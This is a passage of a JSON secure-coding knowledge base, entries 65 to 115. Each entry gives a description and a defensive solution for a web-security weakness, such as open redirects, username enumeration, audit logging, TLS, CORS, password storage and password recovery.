"Description": "Whenever certain security settings in your application frameworks (e.g., Struts, Spring, ASP.NET) and libraries are not set to secure values, this could lead to vulnerabilities in your application which an attacker could exploit. ",
"Solution": "Make sure all your security settings in your development framework are set to secure values. This can be checked by using hardening guides. "
},
{
"kbId": 65,
"title": "Insecure datastorage",
"Description": "Whenever sensitive data is stored cleartext, this data is compromised as soon as it falls into the hands of an attacker. ",
"Solution": "Sensitive data in all forms should always be stored by an encrypted manner. We recommend to follow the \"Secure Cryptographic datastorage\" cheatsheet found on OWASP.https://www.owasp.org/index.php/Cryptographic_Storage_Cheat_Sheet "
},
{
"kbId": 66,
"title": "Authentication based on the knowledge of a secret URL",
"Description": "This is a form of security by obscurity. Whenever an attacker manages to fuzz or spider this URL the application could compromise whatever is behind this URL. ",
"Solution": "Always implement proper authentication mechanisms that are not using a static authentication URL. "
},
{
"kbId": 67,
"title": "Open forward and Open redirects",
"Description": "Unvalidated redirects and forwards are possible when a web application accepts untrusted input that could cause the web application to redirect the request to a URL contained within the untrusted input. By modifying untrusted URL input to a malicious site, an attacker may successfully launch a phishing scam and steal user credentials. Because the server name in the modified link is identical to the original site, phishing attempts may have a more trustworthy appearance. Unvalidated redirect and forward attacks can also be used to maliciously craft a URL that would pass the application''s access control check and then forward the attacker to privileged functions that they would normally not be able to access. ",
"Solution": "Use a whitelisting method for determining where the user should be redirected towards. You could also show a warning when redirecting to potentially untrusted content.If not deemed necessary user supplied input should not be used in redirects and forwards anyways. "
},
{
"kbId": 68,
"title": "Incorrect or missing charset",
"Description": "When the browser has to guess the charset according to the content that is presented by the application, then this could lead to XSS injections when the guess is wrong. ",
"Solution": "Define the charset for all your pages in order to prevent the browser for guessing the content types.This could be done by adding a meta header in the head of your HTML like:For HTML4: ```html <meta httpequiv=\"ContentType\" content=\"text/html;charset=ISO88591\"> ``` For HTML5: ```html <meta charset=\"UTF8\"> ``` Or simply by setting contenttype headers by your serverside language, C example of a content type header: Response.AppendHeader(\"ContentType:text/html\", \"charset=UTF8\"); "
},
{
"kbId": 69,
"title": "Extraneous files in document root",
"Description": "Whenever the document root contains extraneous files, these files could be accessed by an attacker or could possibly contain functionality which could contain other vulnerabilities. ",
"Solution": "Extraneous files in document root should be investigated and deleted if it''s not necessary for the operation of the application.There are more chances of accessing hidden folders, files and some configuration files to be accessed through document root.For example if you are using some version control system like git or svn. You may have .git, .svn folders and .gitignore files. If you are using IDE project files, you may have .idea hidden folder. Even there are chances of configuration files with common extensions, like config.json, config.yml, config.xml, package.json, .htaccess, README.md files to be present in the document root. Even there are chances of having swap files, backup files to be there in the document root.The solution for this problem is to prevent directory listing , remove the hidden folders, files and configuration files. We can even prevent the users from accessing this files with properly  configuring the configuration files of the server like .htaccess files."
},
{
"kbId": 70,
"title": "Username enumeration",
"Description": "Whenever an application generates an error like:\"This username already exists\"An attacker could enumerate these usernames, enlarging his chance for a successful bruteforce attack. Same goes for \"Password forget\" functions.Whenever an user forgets his password, make him fill in his email address rather than an username. ",
"Solution": "All error messages should be generalized in order to prevent username enumeration. Also sometimes you cannot avoid information leaking in functionalities such as a registration page. Here you need to use tarpitting methods to prevent an automated attack by an attacker."
},
{
"kbId": 71,
"title": "HTTP header injection",
"Description": "HTTP header injection is a general class of web application security vulnerability which occurs when Hypertext Transfer Protocol (HTTP) headers are dynamically generated based on user input. Header injection in HTTP responses can allow for HTTP response splitting (also known as CRLF, Carriage Return Line Feed), Session fixation via the SetCookie header, crosssite scripting (XSS), and malicious redirect attacks via the location header. HTTP header injection is a relatively new area for webbased attacks, and has primarily been pioneered by Amit Klein in his work on request/response smuggling/splitting. Vulnerabilities due to HTTP header injections such as CRLF are no longer feasible due to the fact that multiple header requests are not possible. ",
"Solution": "When userinput will be used in HTTP headers then the newlines should be escaped in a correct manner. Recommended would be a whitelist of expected input or use a validation method which for example only accepts alphanumeric values. Every detection of input which is out of the intended operation should be rejected. "
},
{
"kbId": 72,
"title": "GET POST requests",
"Description": "Authors of services which use the HTTP protocol SHOULD NOT use GETbased forms for the submission of sensitive data, because this will cause this data to be encoded in the RequestURI. Many existing servers, proxies, and browsers will log the request URL in some place where it might be visible to third parties. Servers can use POSTbased form submission instead. GET parameters are also more likely to be vulnerable to XSS. Please refer to the XSS manual in the knowledge base for more information. ",
"Solution": "Whenever transmitting sensitive data always do this by means of the POST request or by header. Note: Avoid userinput in your application header, this could lead to vulnerabilities. Also make sure you disable all other HTTP request methods which are unnecessary for your applications operation such as; REST, PUT, TRACE, DELETE, OPTIONS, etc, since allowing these request methods could lead to vulnerabilities and injections. "
},
{
"kbId": 73,
"title": "Insecure internal communication",
"Description": "Whenever organizations communicate by means of unencrypted connections, an attacker could easily sniff insecure communications and access sensitive information. ",
"Solution": "Use TLS encrypted data lines for all internal communication channels. Also, your infrastructure should not traverse unencrypted or weakly encrypted links. Because if so, all your data''s integrity and confidentiality will be lost. "
},
{
"kbId": 74,
"title": "Sensitive information stored alongside the source code",
"Description": "Sometimes when developing an application a programmer stores a password or other credentials into the sourcecode as a comment for other developers to login into the application. When these comments still exist in a live environment, an attacker could use these credentials to gain access to the system. ",
"Solution": "Search your source code for comments which contains possible usercredentials. You should also verify that there are no secrets and API keys are included in the source code, or end up within the resulting binary.This also applies to providing information about business logic and other critically sensitive information. Verify that there is no sensitive business logic, secret keys or other proprietary information in client side code. "
},
{
"kbId": 75,
"title": "The possible risks to the application must be documented",
"Description": "The information that is stored of the application and/or user activities needs to be documented, this will make it transparent where sensitive information is stored and why. ",
"Solution": "Create a section in the documentation of the project that defines the information that will be stored. This makes it easier to make estimations about critical parts of your application which deserve extra attention. "
},
{
"kbId": 76,
"title": "Possible attackers of the application must be documented",
"Description": "Authentication decisions should be logged along with relevant metadata for security  investigations. This information could for example, be used whenever there is suspicion about accounts being compromised. Also, passwords and other sensitive information should never be stored in these log files. Whenever an attacker gains knowledge of these files, this information could be used to compromise other accounts. Note: \"Usernames should also never be stored in the log files, users are not always paying attention to their actions and sometimes provide the username form field with their password. If the application would log the usernames, these passwords are now also stored and can be used to compromise accounts whenever an attacker gains knowledge of these files. ",
"Solution": "Verify that all authentication decisions can be logged, without storing sensitive session  identifiers or passwords. This should include requests with relevant metadata needed for security investigations. "
},
{
"kbId": 77,
"title": "Audit logs",
"Description": "An audit trail (also called audit log) is a securityrelevant chronological record, set of records, and/or destination and source of records that provide documentary evidence of the sequence of activities that have affected at any time a specific operation, procedure, or event. ",
"Solution": "An audit log should contain the following items: User ID  Operation  Success/failure of the operation  Privileges  TimestampDepending on the gravity of the users violation, there should also be a record kept for each user to lock their accounts after a certain number of violations. This should be applied since we can now assume it is an attacker trying to compromise your application.Also when doing audit logs, make sure you always do logging before taking action in case the action is not properly processed or terminated by your application. When using this approach you are always in possession of an complete audit trail. "
},
{
"kbId": 78,
"title": "User credentials in audit logs",
"Description": "Whenever there are user credentials supplied in an audit log, this could become a risk whenever an attacker could gain access to one of these log files. ",
"Solution": "Instead of storing user credentials, you may want to use user ID''s in order to identify the user in the log files."
},
{
"kbId": 79,
"title": "Intrusion detecting and reporting",
"Description": "All possible attacks on your application should be detected and reported in order to prevent further escalation. ",
"Solution": "Intrusion detecting could be done by means of a:\"Positive security model:\" In this model, you create certain regular expressions in order to only make the application pass the socalled \"known good\". Whenever an application detects strange behavior and anomalies, these issues should be reported. Keep in mind whenever the application changes, this whitelist method has to evolve alongside with it. A big con is it could generate a lot of reports and alerts.\"Negative security model:\" Create a blacklist with known attacks and malicious input and make the application report on detection of this input. You could also prioritise different malicious input and classify them into different groups.Whatever method you may choose to prefer, you should always ensure error handling logic in security controls denies access by default. With this approach applied, you will have a higher probability that whenever an attacker manages to break your applications intended operation, it will not fail in a way which increases his attack vector. "
},
{
"kbId": 80,
"title": "Authentication at a central location",
"Description": "Authentication should always be performed at a central location in the application, in order to prevent missing authentication on certain levels in the application. ",
"Solution": "Use a central location for authentication. If u want to put extra constraints on the users for accessing critical parts of your application, you have to implement stepup or adaptive authentication mechanisms.Verify that alternative and less secure access paths do not exist. "
},
{
"kbId": 81,
"title": "IP adresses in internal HTTP headers",
"Description": "Whenever IP addresses are used in HTTP headers in internal structures of your organization, an attacker could use these to enlarge his attack vector and reconstruct your internal infrastructures. ",
"Solution": "Never use IP addresses in internal HTTP headers. "
},
{
"kbId": 82,
"title": "Authentication enforced by the web sever",
"Description": "Authentication should be enforced by the webserver. Whenever these configurations are not enforced on the server, an attacker could gain access to authorized pages on your application. ",
"Solution": "Always make sure your webserver and application are correctly configured to handle authentication. Also the application and webserver should deny access by default should there be an error of any kind. "
},
{
"kbId": 83,
"title": "The audit log must include a priority system",
"Description": "If the audit log does not contain a clear priority system, it will be difficult to prioritize different types of process failures. ",
"Solution": "Whenever the webapplication is writing error messages to the error log, then these need to have a correct priority label. The labels that you can use are LOW, MEDIUM and HIGH. These labels can then be used at a later moment in time for easy and quick analysing capabilities of the log files.You should also verify security logging controls, provide the ability to log success and particularly failure events that are identified as securityrelevant. "
},
{
"kbId": 84,
"title": "Servers must not be trusted without explicit authentication",
"Description": "Whenever the server your webapplication is connecting towards is not using any form of explicit authentication and is internet facing, then this means the server cannot be trusted. This is because the server can be potentially be owned and managed by everybody including hackers. ",
"Solution": "Whenever the webapplication is facing the internet third parties trying to access it should always use a form of authentication in order to gain access. "
},
{
"kbId": 85,
"title": "Ensure overall security",
"Description": "The primairy authentication mechanism is most often a good hardened functionality because it gets a lot of attention during development. However, this is mostly not the case for secondary authentication mechanisms such as password forget functions, or  other alternative paths that could lead to authenticating to the target application. ",
"Solution": "Verify all account identity authentication functions (such as update profile, forgot password,  disabled / lost token, help desk or IVR) that might regain access to the account are  at least as resistant to attack as the primary authentication mechanism. "
},
{
"kbId": 86,
"title": "Re authentication",
"Description": "Whenever a user is changing credentials such as his password, the user should always be challenged by the application to reauthenticate himself. This is in order to prevent an attacker from changing credentials if ever an attacker could hijack another users session. ",
"Solution": "Verify that the changing password functionality includes the old password, the new password, and a password confirmation, as well as a passphrase strength indication to encourage the adoption of strong password phrases. This same principle applies for other operations that are considered critical such as changing an email adress or phone number. "
},
{
"kbId": 87,
"title": "No shared knowledge for secret questions",
"Description": "Whenever an application ask an user a secret question i.e a password forgot functionality, these questions should not be shared knowledge an attacker could get from the web to prevent him compromising the account by this function. ",
"Solution": "Secret questions should never include shared knowledge, predictable or easy guessable values.Otherwise the answers for these secret questions can be easilly looked up on the internet by means  of social media accounts and the like. "
},
{
"kbId": 88,
"title": "Disallow the use of old passwords",
"Description": "This is a mitigation of the risk that a password can leak by any means towards a possible attacker. Because of password reuse, this could happen not only due to a leak in your site. Changing the password to a new one minimizes the damage.Also, users really don''t like changing their passwords. So what users used to do when forced to change their password was to change it twice  once to some temporary password and then a second time back to the original password. ",
"Solution": "Keep a number of password hashes entries greater than the number of times that the change password functionality execution is permitted and validate that the new password hash is not one of those entries. "
},
{
"kbId": 89,
"title": "Absolute session time out",
"Description": "All sessions should implement an absolute timeout, regardless of session activity. This timeout defines the maximum amount of time a session can be active, closing and invalidating the session upon the defined absolute period since the given session was initially created by the web application. After invalidating the session, the user is forced to (re)authenticate again in the web application and establish a new session. The absolute session limits the amount of time an attacker can use a hijacked session and impersonate the victim user. ",
"Solution": "Always ensure that sessions absolute timeout  is on the serverside in order to decrease a hackers attack vector. "
},
{
"kbId": 90,
"title": "Logout structuring",
"Description": "Placing a logout link on every page that requires authentication helps the user end the session when he is done with the site. Ending the session helps prevent hijacking. ",
"Solution": "Identify all pages that use authentication. Make a list of all pages on your site that use authentication then verify the presence of logout links. Examine each page that uses authentication to make sure it has a logout link in a location that can be found intuitively. "
},
{
"kbId": 91,
"title": "Verify that the sensitive information is never disclosed",
"Description": "Information exposure through query strings in URL is when sensitive data is passed to parameters in the URL. This allows attackers to obtain sensitive data such as usernames, passwords, tokens (authX), database details, and any other potentially sensitive data. Simply using HTTPS does not resolve this vulnerability.Regardless of using encryption, the following URL will expose information in the locations detailed below: https://vulnerablehost.com/authuser?user=bob&authz_token=1234&expire=1500000000The parameter values for ''user'', ''authz_token'', and ''expire'' will be exposed in the following locations  when using HTTP or HTTPS: Referer Header  Web Logs  Shared Systems  Browser History  Browser Cache  Shoulder SurfingWhen not using an encrypted channel, all of the above and the following:  ManintheMiddle  ",
"Solution": "Sensitive informtion should never be included in the URL. "
},
{
"kbId": 92,
"title": "Session Domain cookies",
"Description": "The Domain option allows you to specify whether or not to send the cookie to subdomains. ",
"Solution": "Setting www.example.com will mean only the exact domain www.example.com will be matched, while .example.com (wildcard) will also match again any subdomain (forums.example.com, blog.example.com).The use of a wildcard is not recommended at all and should be avoided.There are a lot of different mitigations in order to harden your session management. These mitigations are amongst others the setting of the \"HttpOnly and secure\" flags on your sessions. Follow the \"Sessions pattern\" list to make sure your session management is secure.Recommended knowledge base items: Cross subdomain cookie attacks"
},
{
"kbId": 93,
"title": "Access control failure",
"Description": "Handling errors securely is a key aspect of secure coding. There are two types of errors that deserve special attention. The first is exceptions that occur in the processing of a security control itself. It is important that these exceptions do not enable behavior that the countermeasures would normally not allow. As a developer, you should consider that there are generally three possible outcomes from a security mechanism:  allow the operation  disallow the operation  exception in general you should design your security mechanism so that a failure will follow the same execution path as disallowing the operation. ",
"Solution": "Security methods like isAuthorized(), isAuthenticated(), and validate() should all return false if there is an exception during processing. If security controls can throw exceptions, they must be very clear about exactly what that condition means. "
},
{
"kbId": 94,
"title": "Input rejection",
"Description": "Whenever the application detects malicious or unexpected userinput, you want to make sure the application actual rejects the submitted userinput rather than directly process it. ",
"Solution": "Verify that the application actually rejects the user requests whenever malicious input is detected by your application. The base of this process will be checking the application for expected userinput, for example: Whenever the user is filling in a form which contains a checkbox, there are fixed values which your application can expect from the user to return. Whenever this value differs from what the application served the user as possible answers, you can assume the request was corrupted and you reject the request.You must also keep track of the users movements by adding an audit trail as well as a counter for tracking the number of his violations(submitting bad input) in your input validation class. You should enforce a lockout whenever a unreasonable number of violations are detected by your application in order to protect it from attackers."
},
{
"kbId": 95,
"title": "Input validation",
"Description": "To ensure that the application is robust against all forms of input data, this data should be sanitized and/or encoded on serverside since an attacker could otherwise easy bypass these checks with an intercepting proxy. ",
"Solution": "All input validation and encodingroutines should be implemented on the serverside outside the reach of an attacker. Just as with the input rejection you should make sure that after validating the userinput, whenever the input is bad it actually rejects, sanitizes or formats your userinput into not malicious data.The recommended method for validating user input would be the positive validation method. Whitelist input validation means allowing only input that is explicitly defined as valid, as opposed to blacklist input validation, which filters out known bad input.You must also keep track of the users movements by adding an audit trail as well as a counter for tracking the number of his violations(submitting bad input) in your input validation class. You should enforce a lockout whenever a unreasonable number of violations are detected by your application in order to protect it from attackers. "
},
{
"kbId": 96,
"title": "Single input validation controls",
"Description": "Input validation refers to the process of validating all the input to an application before using it. Input validation is absolutely critical to application security, and most application risks involve tainted input at some level. ",
"Solution": "Verify that a single input validation control is used by the application for each type of data that is accepted. This way your validation controls stay clear, transparent and manageable. This method leaves less room for error."
},
{
"kbId": 97,
"title": "Logging validation failures",
"Description": "When you log all the input validation failures in your application you can discover in an early stage that your application is under attack and take quick countermeasures against the attackers. ",
"Solution": "Verify that all input validation failures are logged in order to counter possible attacks in an early stage. Also you want to verify that error handling logic in security controls denies access by default. "
},
{
"kbId": 98,
"title": "Logging implemented on the serverside",
"Description": "Logging should always be implemented on the serverside since an attacker otherwise  manipulates the functionality and erases his traces. ",
"Solution": "Verify that all logging controls are implemented on the serverside. "
},
{
"kbId": 99,
"title": "Logging guidelines",
"Description": "The logging should contain some guidelines in order to organize your logging file in such a way it  would allow for a detailed investigation of the timeline when an event happens. ",
"Solution": "The logging file should at least contain, a timestamp from a reliable source, severity level of the event, an indication that this is a security relevant event (if mixed with other logs), the identity of the user that caused the event (if there is a user associated with the event), the source IP address of the request associated with the event, whether the event succeeded or failed, and a description of the event. Also verify that log fields from trusted and untrusted sources are distinguishable in log entries, preferably stored in different files so they cannot taint each other whenever log injection occurs.Verify accessing sensitive data is logged, if the data is collected under relevant data protection directives or where logging of accesses is required. "
},
{
"kbId": 100,
"title": "Log viewing software code injection",
"Description": "Whenever user supplied input is being handled into log viewing software, this software can be manipulated by potential attackers whenever this input is not properly being sanitized before outputting in the software. Depending on the context of where the supplied input is being used this could lead to an entire subset of attacks. ",
"Solution": "You should consider these three controls when supplying information to the log viewing software:     \u2022\tDesign: If at all possible, avoid logging data that came from external inputs.     \u2022\tImplementation: Ensure that all log entries are statically created, or if they must record external data that the input       is vigorously whitelist checked.       \u2022\tRun time: Avoid viewing logs with tools that may interpret control characters in the file, such as commandline shells.Also verify that all nonprintable symbols and field separators are properly encoded in log entries, to prevent log injection. "
},
{
"kbId": 101,
"title": "CA certificates",
"Description": "In cryptography, a certificate authority or certification authority (CA) is an entity that issues digital certificates. A digital certificate certifies the ownership of a public key by the named subject of the certificate. Sometimes it happens that a CA goes bad and is revoked from the browser. This will lead to untrusted TLS connections if your application uses an issued certificate from this CA.A selfsigned certificate is an identity certificate that is signed by the same entity whose identity it certifies. This term has nothing to do with the identity of the person or organization that actually performed the signing procedure. In technical terms a selfsigned certificate is one signed with its own private key.In typical public key infrastructure (PKI) arrangements, a digital signature from a certificate authority (CA) attests that a particular public key certificate is valid. Each CA has one or more root keys; and the certificates associated with those public keys are \"trust anchors\" that use a special type of selfsigned certificates. Establishing trust of the CA root certificate is dependent upon procedures beyond checking its digital signature. ",
"Solution": "In a CA based PKI system, the CA must be trusted by both parties. This is usually accomplished by placing the CA certificates in a whitelist of trusted certificates. For example, web browsers developers may use procedures specified by the CA/Browser Forum, or a private CA''s certificate may be placed in the firmware of an embedded system. The trust issues of an entity accepting a new selfsigned certificate, is similar to the issues of an entity trusting the addition of a new CA certificate. The parties in a selfsigned PKI must establish trust with each other (using procedures outside the PKI), and confirm the accurate transfer of public keys (e.g. compare the hash out of band).There are many subtle differences between CA signed and selfsigned certificates, especially in the amount of trust that can be placed in the security assertions of the certificate. Some CAs can verify the identity of the person to whom they issue a certificate; for example the US military issues their Common Access Cards in person, with multiple forms of other ID. The CA can attest identity values like these by including them in the signed certificate. The entity that validates the certificate can trust the information in that certificate, to the same extent that they trust the CA that signed it (and by implication, the security procedures the CA used to verify the attested information).With a selfsigned certificate by contrast, trust of the values in the certificate are more complicated because the entity possesses the signing key, and can always generate a new certificate with different values. For example, the validity dates of a selfsigned certificate might not be trusted because the entity could always create and sign a new certificate that contained a valid date range. The values in a selfsigned certificate can be trusted when the following conditions are true: the values were (outofband) verified when the selfsigned was formally trusted, and there is a method to verify the selfsigned certificate has not changed after it was trusted. For example, the procedure of trusting a selfsigned certificate includes a manual verification of validity dates, and a hash of the certificate is incorporated into the white list. When the certificate is presented for an entity to validate, they first verify the hash of the certificate matches the reference hash in the whitelist, and if they match (indicating the selfsigned certificate is the same as the one that was formally trusted) then the certificate''s validity dates can be trusted. Special treatment of X.509 certificate fields for selfsigned certificate can be found in RFC 3280.Verify that connections to and from the server use trusted TLS certificates. Where internally generated or selfsigned certificates are used, the server must be configured to only trust specific internal CAs and specific selfsigned certificates. All others should be rejected. "
},
{
"kbId": 102,
"title": "All connections should be TLS",
"Description": "Whenever an application provides TLS, all connections should be TLS otherwise the encryption will be lost. ",
"Solution": "Verify that TLS is used for all connections (including both external and backend connections) that are using authentication tokens or that involve sensitive data or functions. This should also be enforced in the application itself wherever possible, for example: Secure flags on cookies, HSTS, certificate pinning etc. "
},
{
"kbId": 103,
"title": "Log TLS connection failures",
"Description": "Failing TLS connections should always be logged. This is a great indicator that ''something'' is wrong. ",
"Solution": "Verify that backend TLS connection failures are logged. "
},
{
"kbId": 104,
"title": "Content type headers",
"Description": "Setting the right content headers is important for hardening your applications security, this reduces exposure to driveby download attacks or sites serving user uploaded content that, by clever naming could be treated by MS Internet Explorer as executable or dynamic HTML files and thus can lead to security vulnerabilities. ",
"Solution": "An example of a content type header would be:      ContentType: text/html; charset=UTF8     or:     ContentType: application/json;           Verify that requests containing unexpected or missing content types are rejected with appropriate headers (HTTP response status 406 Unacceptable or 415 Unsupported Media Type). "
},
{
"kbId": 105,
"title": "Malicious intent",
"Description": "Before pushing a code live you should check the software for malicious code in order to make sure no developers with evil intent made backdoors or deliberately put in exploits.Dependencies and third party libraries should also be validated against malicious code. These depedencies and libraries should also be validated for known vulnerabilities (CVE) ",
"Solution": "Running your code through a static code analyzer or auditing tools could give you a chance to find malicious pieces of code which could be embedded into the software. Also if the new or adjusted functionality is critical then check manually it in the form of a code review for back doors, Easter eggs, and logic flaws.This should also mean that authorized administrators must have the capability to verify the integrity of all securityrelevant configurations to ensure that they have not been tampered with.Determine also that the business logic of highvalue transactions is not imported from untrusted third party libraries.Note: Studies have shown backdoors written by employees with malicious intend will propably do this within the first half year of their employment. The implementing of back doors has little to do with how happy an employee is with the current employer, it has proven to be a trait of character rather than a trait of discontent. "
},
{
"kbId": 106,
"title": "Sandboxing",
"Description": "A sandbox is a security mechanism for separating running programs. It is often used to execute untested code, or untrusted programs from unverified third parties, suppliers, untrusted users and untrusted websites. It''s creating an extra layer of security where an attacker first needs to break out from. ",
"Solution": "Examples of sandbox implementations include the following: A jail: networkaccess restrictions, and a restricted file system namespace. Jails are most commonly used in virtual hosting. Rulebased execution gives users full control over what processes are started, spawned (by other applications), or allowed to inject code into other applications and have access to the net, by having the system assign access levels to users or programs according to a set of determined rules. It also can control file/registry security (what programs can read and write to the file system/registry). In such an environment, viruses and Trojans have fewer opportunities of infecting a computer. The SELinux and AppArmor security frameworks are two such implementations for Linux. Virtual machines emulate a complete host computer, on which a conventional operating system may boot and run as on actual hardware. The guest operating system runs sandboxed in the sense that it does not function natively on the host and can only access host resources through the emulator. Sandboxing on native hosts: Security researchers rely heavily on sandboxing technologies to analyze malware behavior  By creating an environment that mimics or replicates the targeted desktops, researchers can evaluate how malware infects and compromises a target host. Numerous malware analysis services are based on the sandboxing technology. Capability systems can be thought of as a finegrained sandboxing mechanism, in which programs are given opaque tokens when spawned and have the ability to do specific things based on what tokens they hold. Capabilitybased implementations can work at various levels, from kernel to userspace. An example of capabilitybased userlevel sandboxing involves HTML rendering in a Web browser. Secure Computing Mode (seccomp) is a sandbox built in the Linux kernel. When activated, seccomp only allows the write(), read(), exit(), and sigreturn() system calls. HTML5 has a \"sandbox\" attribute for use with iframes. Java virtual machines include a sandbox to restrict the actions of untrusted code, such as a Java applet. The .NET Common Language Runtime provides Code Access Security to enforce restrictions on a untrusted code.``` "
},
{
"kbId": 107,
"title": "Repudiation attack",
"Description": "A repudiation attack happens when an application or system does not adopt controls to properly track and log users actions, thus permitting malicious manipulation or forging the identification of new actions. This attack can be used to change the authoring information of actions executed by a malicious user in order to log wrong data to log files. Its usage can be extended to general data manipulation in the name of others, in a similar manner as spoofing mail messages. If this attack takes place, the data stored in log files can be considered invalid or misleading. ",
"Solution": "This type of data should always be processed out of reach of the user and should be verified and enforced serverside. "
},
{
"kbId": 108,
"title": "Server side validation",
"Description": "Validation of user supplied input must always be enforced on the server side. Whenever validation of the input is being perfomed on the client side then the constraints can easilly be bypassed whenever an attacker uses an intercepting proxy which he can use to tamper data after they have been validated and send to the server. Or the attacker can simply change the constraint on the client side in his browser to bypass the  constraints. ",
"Solution": "All validation of input should be handled on the server side. Whenever the validation is handled on  the server side, the validation logic is outside of the scope of the attacker and he can not influence the results.Note: Validation of input should never be done with a blacklisting aproach since attackers can be very nifty in bypassing these type of constraints. Always perform white list validation checks preferably in combination on type checking. i.e if the application expects the value to be an integer, do not make the application accept a value of a string. This input should be logged and rejected. "
},
{
"kbId": 109,
"title": "Privilege escalation",
"Description": "Attackers with low access rights wil always try to elevate their privileges in order to get more sensitive information/functionalities at their disposal. This can be achieved by for example:  Functions that fail to check authorization   Compromised functions/services that run with higher privileges   Compromised user accounts with higher privilegesThese examples just scratch the surface of what attackers will try in order to elevate their privilages on your application/system. Therefore it is very important to take this reccomendation high into account. ",
"Solution": "Checking if a user has enough authorization to execute certain request should always be enforced on the serverside. Also, you may apply the Principle of Least privilege, the principle of least privilege recommends that accounts have the least amount of privilege required to perform their business processes. This encompasses user rights, resource permissions such as CPU limits, memory, network, and file system permissions. For example, if a user only requires access to the network, read access to a database table, and the ability to write to a log, this describes all the permissions that should be granted. Under no circumstances should the user be granted administrative privileges.  "
},
{
"kbId": 110,
"title": "Enforce sequential step order",
"Description": "Whenever a functionality consists out of following several steps to achieve some goal i.e,User adds items to chart > User enters shipping information > User pays for goods > Items will be shipped. You want to make sure the user can not skip the payment step in order to receive his goods. ",
"Solution": "In order to verify that this stage was run through by a sincere user you want to enforce the application to only process business logic flows in sequential step order, with all steps being processed in realistic human time, and not process out of order, skipped steps, processed steps from another user, or too quickly submitted transactions."
},
{
"kbId": 111,
"title": "Step up or adaptive authentication",
"Description": "Whenever a user browses a section of a webbased application that contains sensitive information the user should be challenged authenticate again using a higher assurance credential to be granted access to this information. This is to prevent attackers from reading sensitive information after they successfully hijacked a user account.  ",
"Solution": "Verify the application has additional authorization (such as step up or adaptive authentication) so the user is challenged before being granted access to sensitive information. This rule also applies for making critical changes to an account or action. Segregation of duties should be applied for highvalue applications to enforce antifraud controls as per the risk of application and past fraud."
},
{
"kbId": 112,
"title": "Cross origin resource sharing",
"Description": "Cross Origin Resource Sharing or CORS is a mechanism that enables a web browser to perform ''crossdomain'' requests using the XMLHttpRequest L2 API in a controlled manner. In the past, the XMLHttpRequest L1 API only allowed requests to be sent within the same origin as it was restricted by the same origin policy. ",
"Solution": "CrossOrigin requests have an Origin header, that identifies the domain initiating the request and is always sent to the server. CORS defines the protocol to use a web browser and a server to determine whether a crossorigin request is allowed. In order to accomplish this goal, there are a few HTTP headers involved in this process, that are supported by all major browsers: Origin  AccessControlRequestMethod  AccessControlRequestHeaders  AccessControlAllowOrigin  AccessControlAllowCredentials  AccessControlAllowMethods  AccessControlAllowHeadersThings you must consider when using CORS1. Validate URLs passed to XMLHttpRequest.open. Current browsers allow these URLs to be cross domain; this behavior can lead to code injection by a remote attacker. Pay extra attention to absolute URLs.2. Ensure that URLs responding with AccessControlAllowOrigin: * do not include any sensitive content or information that might aid an attacker in further attacks. Use the AccessControlAllowOrigin header only on chosen URLs that need to be accessed crossdomain. Don''t use the header for the whole domain.3. Allow only selected, trusted domains in the AccessControlAllowOrigin header. Prefer whitelisting domains over blacklisting or allowing any domain (do not use * wildcard nor blindly return the Origin header content without any checks)4. Keep in mind that CORS does not prevent the requested data from going to an unauthenticated location. It''s still important for the server to perform usual CSRF prevention.5. While the RFC recommends a preflight request with the OPTIONS verb, current implementations might not perform this request, so it''s important that \"ordinary\" (GET and POST) requests perform any access control necessary.6. Discard requests received over plain HTTP with HTTPS origins to prevent mixed content bugs.7. Don''t rely only on the Origin header for Access Control checks. Browser always sends this header in CORS requests, but may be spoofed outside the browser. Applicationlevel protocols should be used to protect sensitive data.**NOTE:**  Modern application frameworks do dynamically allocation of the origin header, resulting in the browser also allowing to send the \"AccessControlAllowCredentials: true\" header as well in requests.  Whenever JSON web tokens are being send in cookies rather than headers, potential attackers could abuse this behaviour to  make unauthenticated XHR get requests on the authenticated users behalf to read sensitive information from the  pages. "
},
{
"kbId": 113,
"title": "Prevent password pre filling",
"Description": "Passwords should never be stored plaintext or in a reversible format on the application. Whenever an attacker hacks  into the applications SQL database the passwords are directly compromised. In the case of prefilled forms in the application, an attacker could also hijack the credentials by badly configured CORS rules or XSS attacks. ",
"Solution": " Verify that forms containing credentials are not filled in by the application. Prefilling by the application implies that credentials are stored in plaintext or a reversible format, which is explicitly prohibited. Passwords should be stored by preferably PBKDF functions.PBKDF2 uses a pseudorandom function and a configurable number of iterations to derive a cryptographic key from a password. Because this process is difficult to reverse (similar to a cryptographic hash function) but can also be configured to be slow to  compute, key derivation functions are ideally suited for password hashing use cases.Examples of good ways to store passwords are with, BCRYPT, Blowfish or in some cases SCRYPT which is a little harder to implement correctlyNOTE: Password prefilling also happens when using the browsers password manager. However this process is different fromt he context described above since the description above implies an application that prefilles credentials from the database/localstorage/etc. "
},
{
"kbId": 114,
"title": "All authentication controls must fail securely",
"Description": "Handling errors securely is a key aspect of secure coding. There are two types of errors that deserve special attention. The first is exceptions that occur in the processing of a security control itself. It''s important that these exceptions do not enable behavior that the countermeasure would normally not allow. As a developer, you should consider that there are generally three possible outcomes from a security mechanism:1. Allow the operation 2. Disallow the operation 3. ExceptionIn general, you should design your security mechanism so that a failure will follow the same execution path as disabling the operation ",
"Solution": "Make sure all the access control systems are thoroughly tested for failing securely before using it in your application. It is common that complete unittest are created especially for this purpose. "
},
{
"kbId": 115,
"title": "Forget password functions",
"Description": "Whenever the application provides a password forget functionality or another  type of recovery methods there are several implementations of hardened proven ways to make the user recover his password. ",
"Solution": "The recommended solutions are to use TOTP (Timebased OneTime Password algorithm). This  method is an example of a hashbased message authentication code (HMAC). It combines a  secret key with the current timestamp using a cryptographic hash function to generate  a onetime password. Because network latency and outofsync clocks can result in the password  recipient having to try a range of possible times to authenticate against, the timestamp typically  increases in 30second intervals, which thus cuts the potential search space.Or the other option is to use a Mathematicalalgorithmbased onetime password method. This other  type of onetime password uses a complex mathematical algorithm, such as a hash chain, to generate  a series of onetime passwords from a secret shared key. Each password cannot be guessed even when  previous passwords are known. The open source OAuth algorithm is standardized; other algorithms are  covered by U.S. patents. Each password is observably unpredictable and independent on previous ones.  Therefore, an adversary would be unable to guess what the next password may be, even with the  knowledge of all previous passwords.Example of a hard token mathimatical algorithm would be a yubikey Example of a soft token TOTP would be google authenticatorThe last resort would be to send a new password by email. This mail should contain a reset link with  a token which is valid for a limited amount of time. Additional authentication based on softtokens  (e.g. SMS token, native mobile applications, etc.) can be required as well before the link is  sent over. Also, make sure whenever such a recovery cycle is started, the application does not  reveal the user\u2019s current password in any way. "
},
{
